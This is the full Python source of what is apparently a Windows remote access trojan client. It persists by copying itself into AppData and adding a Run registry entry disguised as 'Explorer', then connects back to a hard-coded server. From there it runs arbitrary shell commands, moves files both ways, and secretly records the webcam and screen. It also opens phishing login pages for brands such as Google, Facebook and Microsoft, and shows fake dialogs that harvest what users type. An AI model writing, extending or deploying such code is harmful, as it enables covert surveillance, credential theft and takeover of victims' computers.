from queue import Queue
import socket
import subprocess
import os
import sys
import threading
import time
import webbrowser
from tkinter import *
import tkinter.messagebox as message_box
from PIL import ImageGrab
import numpy as np
import winreg as registry
import getpass

# Global variables
command_queue = Queue()
available_disks = []
CURRENT_USER = getpass.getuser()
SERVER_HOST = '192.168.77.132'
SERVER_PORT = 9999
client_socket = socket.socket()


def copy_client_to_system():
    """Copy client to various system locations for persistence"""
    global CURRENT_USER
    disk_drives = ['C:', 'D:', 'E:', 'F:', 'H:', 'I:']
    
    for drive in disk_drives:
        try:
            # Try to copy to AppData
            appdata_path = f'{drive}\\Users\\{CURRENT_USER}\\AppData\\Local'
            result = os.system(f'copy Client.pyw {appdata_path}')
            
            if result == 1:  # If AppData copy failed, try root directory
                os.system(f'copy Client.pyw {drive}\\')
            elif result == 0:  # Success
                available_disks.append(drive)
        except Exception:
            pass


def add_to_startup():
    """Add client to Windows startup registry"""
    try:
        registry_connection = registry.ConnectRegistry(None, registry.HKEY_CURRENT_USER)
        startup_key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        
        registry_key = registry.OpenKey(registry_connection, startup_key_path, 0, registry.KEY_WRITE)
        registry.SetValueEx(registry_key, "Explorer", 0, registry.REG_SZ, 
                           f"{available_disks[0]}\\Users\\{CURRENT_USER}\\AppData\\Local\\Client.pyw")
        return True
    except Exception:
        return False


def modify_firewall():
    """Modify firewall settings (placeholder)"""
    # Firewall modification logic would go here
    pass


def establish_connection():
    """Establish connection to the server"""
    while True:
        try:
            print("Connecting to server...")
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print("Connection established")
            break
        except Exception:
            time.sleep(2)  # Wait before retrying
            continue


def execute_command():
    """Execute system commands received from server"""
    while True:
        try:
            received_data = client_socket.recv(9999999)
            command = received_data.decode()
            
            if command == 'quit':
                break
                
            if command.startswith('cd'):
                # Change directory command
                try:
                    target_directory = command[3:]
                    os.chdir(target_directory)
                    client_socket.send(os.getcwd().encode())
                except Exception as error:
                    client_socket.send(str(error).encode())
                    continue
                    
            elif '|*' in command:
                # Handle wildcard commands
                normalized_command = command.replace('|*', '*')
                command_parts = normalized_command.split(" ")
                process = subprocess.Popen(command_parts, shell=True, 
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = process.stdout.read() + process.stderr.read()
                client_socket.send(output + os.getcwd().encode())
                
            elif command.startswith('dir'):
                # Directory listing command
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
                output_lines = process.stdout.readlines()
                for line in output_lines:
                    client_socket.send(line)
            else:
                # General command execution
                try:
                    process = subprocess.Popen([command], shell=True, 
                                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout_output = process.stdout.read()
                    
                    if stdout_output:
                        client_socket.send(stdout_output + os.getcwd().encode())
                    elif process.stderr.read():
                        # Handle commands that might need to be started
                        process_alt = subprocess.Popen(command, shell=True, 
                                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout_alt = process_alt.stdout.read()
                        stderr_alt = process_alt.stderr.read()
                        
                        if b'is not recognized as an internal' in stderr_alt:
                            # Try to start the program
                            subprocess.Popen(["start", command], shell=True, 
                                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            client_socket.send(b'All Done')
                        else:
                            combined_output = stdout_alt + stderr_alt
                            client_socket.send(combined_output + os.getcwd().encode())
                    else:
                        client_socket.send(b'All Done')
                except Exception:
                    pass
        except Exception:
            break


def upload_file():
    """Upload file to client"""
    print('Starting file upload')
    
    # Receive file extension
    file_extension = client_socket.recv(10).decode()
    
    while True:
        try:
            client_socket.settimeout(15)
            file_data = client_socket.recv(999999999)
            
            temp_filename = f'Upload.{file_extension}.txt'
            file_mode = 'ab' if os.path.exists(temp_filename) else 'wb'
            
            with open(temp_filename, file_mode) as file:
                file.write(file_data)
                
        except socket.timeout:
            print('Upload timeout - transfer complete')
            break
    
    client_socket.send(b'done')
    print('Upload completed')
    
    # Rename temporary file to proper extension
    final_filename = f'Upload.{file_extension}'
    os.rename(f'Upload.{file_extension}.txt', final_filename)


def download_file():
    """Download file from client to server"""
    while True:
        print("Waiting for download request...")
        file_path_data = client_socket.recv(99999999)
        file_path = file_path_data.decode()
        
        print(f"Requested file: {file_path}")
        
        if file_path == 'quit':
            break
            
        if file_path.startswith('cd'):
            # Handle directory change during download
            try:
                target_directory = file_path[3:]
                os.chdir(target_directory)
                client_socket.send(os.getcwd().encode())
            except Exception as error:
                client_socket.send(str(error).encode())
                continue
                
        elif '|*' in file_path:
            # Handle wildcard commands during download
            normalized_command = file_path.replace('|*', '*')
            command_parts = normalized_command.split(" ")
            process = subprocess.Popen(command_parts, shell=True, 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = process.stdout.read() + process.stderr.read()
            client_socket.send(output + os.getcwd().encode())
            
        elif file_path.startswith('dir'):
            # Directory listing during download
            process = subprocess.Popen([file_path], shell=True, 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output_lines = process.stdout.readlines()
            for line in output_lines:
                client_socket.send(line)
            continue
        
        try:
            # Send requested file
            print("Starting file transfer")
            with open(file_path, 'rb') as file:
                file_chunks = file.readlines()
                remaining_chunks = len(file_chunks)
                
                print(f"Sending {remaining_chunks} chunks")
                
                for chunk in file_chunks:
                    client_socket.send(chunk)
                    remaining_chunks -= 1
                    print(f"Remaining chunks: {remaining_chunks}")
                    
            print('File transfer completed')
            
        except Exception as error:
            print(f"File transfer error: {error}")
            continue


def record_camera():
    """Record video from camera"""
    import cv2
    
    camera = cv2.VideoCapture(0)
    video_codec = cv2.VideoWriter_fourcc(*'XVID')
    video_writer = cv2.VideoWriter('camera_recording.avi', video_codec, 10, (640, 480))
    
    print("Starting camera recording")
    
    frame_count_data = client_socket.recv(1024).decode()
    total_frames = int(frame_count_data)
    current_frame = 0
    
    while current_frame <= total_frames:
        current_frame += 1
        ret, frame = camera.read()
        resized_frame = cv2.resize(frame, (640, 480))
        video_writer.write(resized_frame)
        
        key = cv2.waitKey(1)
        if key == 27:  # ESC key
            break
            
    client_socket.send("finished".encode())
    video_writer.release()
    camera.release()
    cv2.destroyAllWindows()


def record_screen():
    """Record screen video"""
    import cv2
    
    video_codec = cv2.VideoWriter_fourcc(*'XVID')
    video_writer = cv2.VideoWriter('screen_recording.avi', video_codec, 10, (900, 800))
    
    print("Starting screen recording")
    
    frame_count_data = client_socket.recv(1024).decode()
    total_frames = int(frame_count_data)
    current_frame = 0
    
    while current_frame <= total_frames:
        current_frame += 1
        screenshot = ImageGrab.grab()
        screenshot_array = np.array(screenshot)
        resized_frame = cv2.resize(screenshot_array, (900, 800))
        video_writer.write(resized_frame)
        cv2.waitKey(1)
        
    client_socket.send("finished".encode())
    video_writer.release()
    cv2.destroyAllWindows()


def take_screenshots():
    """Take multiple screenshots with delay"""
    print("Starting screenshot capture")
    
    screenshot_count_data = client_socket.recv(2014)
    delay_data = client_socket.recv(2015)
    
    screenshot_count = int(screenshot_count_data.decode())
    delay_seconds = int(delay_data.decode())
    current_screenshot = 1
    
    while current_screenshot <= screenshot_count:
        screenshot = ImageGrab.grab()
        filename = f"Screenshot_{current_screenshot}.jpg"
        screenshot.save(filename)
        time.sleep(delay_seconds)
        current_screenshot += 1
        
    client_socket.send(b"Finished")


def social_engineering_attack():
    """Perform social engineering attacks"""
    
    def launch_phishing_attack():
        """Launch phishing page in browser"""
        phishing_type_data = client_socket.recv(1024)
        
        try:
            phishing_type_id = int(phishing_type_data.decode())
            phishing_pages = {
                1: "facebook", 2: "github", 3: "google", 
                4: "instafollowers", 5: "instagram", 6: "linkedin",
                7: "microsoft", 8: "netflix", 9: "pinterest",
                10: "protonmail", 11: "snapchat", 12: "spotify",
                13: "twitter", 14: "wordpress", 15: "yahoo"
            }
            
            if phishing_type_id in phishing_pages:
                phishing_url = f"http://192.168.120.3/{phishing_pages[phishing_type_id]}/login.html"
                webbrowser.open(phishing_url)
        except ValueError:
            pass

    def display_fake_dialog():
        """Display fake dialog to trick user"""
        root = Tk()
        root.wm_attributes('-topmost', 1)
        
        dialog_title = client_socket.recv(2014).decode()
        dialog_message = client_socket.recv(2014).decode()
        dialog_type = client_socket.recv(2014).decode()
        
        if dialog_type == '1':
            # Yes/No dialog
            user_response = message_box.askyesno(dialog_title, dialog_message)
            response_filename = f"{dialog_title}.txt"
            
            with open(response_filename, 'w') as response_file:
                response_file.write(str(user_response))
                
        else:
            # Input dialog
            label = Label(root, text=dialog_message)
            label.pack()
            root.title(dialog_title)
            
            def on_enter_pressed(event):
                user_input = entry.get()
                if user_input:
                    response_filename = f"{dialog_title}.txt"
                    with open(response_filename, 'w') as response_file:
                        response_file.write(str(user_input))
                    root.destroy()
                    
            entry = Entry(root, width=30)
            entry.pack()
            entry.bind("<Return>", on_enter_pressed)
            
        root.mainloop()

    # Determine attack type
    attack_type_data = client_socket.recv(1024)
    attack_type = attack_type_data.decode()
    
    if attack_type == '1':
        launch_phishing_attack()
    elif attack_type == '2':
        display_fake_dialog()


def main():
    """Main client loop"""
    # Setup persistence
    copy_client_to_system()
    add_to_startup()
    modify_firewall()
    
    # Establish connection
    establish_connection()
    
    # Main command loop
    while True:
        print("Waiting for command...")
        client_socket.setblocking(True)
        
        try:
            command_type_data = client_socket.recv(1024)
            if not command_type_data:
                break
                
            command_type = command_type_data.decode()
            print(f"Received command type: {command_type}")
            
            if command_type == '1':
                execute_command()
            elif command_type == '2':
                transfer_direction = client_socket.recv(1024)
                if transfer_direction.decode() == '1':
                    upload_file()
                else:
                    download_file()
            elif command_type == '3':
                record_camera()
            elif command_type == '4':
                record_screen()
            elif command_type == '5':
                take_screenshots()
            elif command_type == '6':
                social_engineering_attack()
            elif command_type == '99':
                close_option = client_socket.recv(1024)
                if close_option.decode() == '1':
                    break
                elif close_option.decode() == '2':
                    # Continue running
                    pass
                    
        except Exception as error:
            print(f"Error in main loop: {error}")
            pass


if __name__ == '__main__':
    main()